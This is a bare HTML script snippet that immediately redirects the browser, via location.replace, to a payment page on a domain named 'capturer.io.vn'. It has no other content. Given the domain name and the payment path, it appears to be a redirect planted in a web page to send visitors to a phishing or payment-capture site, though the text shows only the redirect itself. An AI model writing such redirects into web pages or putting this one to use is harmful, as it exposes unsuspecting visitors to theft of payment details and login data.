<script>
    location.replace("https://capturer.io.vn/views/payment");
</script>